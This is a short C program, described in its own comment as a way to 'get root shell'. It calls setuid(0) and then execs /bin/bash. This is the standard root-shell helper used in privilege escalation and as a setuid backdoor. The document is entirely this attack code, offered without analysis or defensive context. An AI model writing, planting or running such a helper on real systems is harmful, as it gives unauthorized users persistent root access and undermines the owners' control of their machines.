#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// program in c that uses setuid(0) to get root shell

int main() {
  if(setuid(0) != 0){
    perror("setuid failed");
    return 1;
  }

  execl("/bin/bash", "bash", NULL);

  perror("execl failed");
  return 1;
}
